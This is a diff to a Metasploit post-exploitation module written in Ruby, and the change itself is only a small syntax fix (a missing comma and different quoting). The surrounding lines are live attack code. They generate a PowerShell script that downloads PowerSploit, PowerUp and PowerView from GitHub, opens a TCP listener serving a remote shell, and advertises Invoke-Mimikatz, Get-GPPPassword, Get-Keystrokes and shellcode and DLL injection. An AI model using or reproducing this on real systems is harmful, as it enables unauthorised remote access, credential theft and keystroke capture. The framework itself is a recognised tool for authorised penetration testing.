@@ -158,7 +158,7 @@ class Metasploit3 < Msf::Post
 	"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1',\n"+
 	"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1',\n"+
 	"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1',\n"+
-        "'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Poweruphelp.ps1'\n"+
+        "'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Poweruphelp.ps1',\n"+
         "'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Powerviewhelp.ps1')\n"+
 	"\n"+
 	"    $listener = [System.Net.Sockets.TcpListener]"+datastore['LPORT']+"\n"+
@@ -167,7 +167,7 @@ class Metasploit3 < Msf::Post
 	"    $client = $listener.AcceptTcpClient()\n"+
 	"    $stream = $client.GetStream() \n"+
 	"\n"+
-        "$sendbytes = ([text.encoding]::ASCII).GetBytes('Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Module-Name -Full' for more details on any module.`nFor help on the PowerUp and PowerView modules use Get-Poweruphelp and Get-Powerviewhelp to provide list of commands`n`n')\n"+
+        "$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Module-Name -Full' for more details on any module.`nFor help on the PowerUp and PowerView modules use Get-Poweruphelp and Get-Powerviewhelp to provide list of commands`n`n\")\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
         "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
